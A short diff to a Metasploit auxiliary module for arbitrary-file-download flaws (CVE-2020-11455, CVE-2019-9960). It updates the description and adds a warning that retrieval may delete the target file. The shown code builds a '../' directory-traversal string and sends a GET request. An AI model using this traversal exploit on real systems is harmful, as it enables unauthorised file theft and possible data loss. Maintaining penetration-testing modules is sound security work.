@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         inclusive.
         In CVE-2020-11455 the getZipFile function within the filemanager functionality
         allows for arbitrary file download.  The file retrieved may be deleted after viewing,
-        however this was not confirmed in testing.
+        which was confirmed in testing.
         In CVE-2019-9960 the szip function within the downloadZip functionality allows
         for arbitrary file download.
         Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,
@@ -63,6 +63,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def cve_2020_11455(cookie, ip)
     vprint_status('Attempting to retrieve file')
+    print_error 'This method will possibly delete the file retrieved!!!'
     traversal = "../" * datastore['DEPTH']
     res = send_request_cgi({
       'method'   => 'GET',
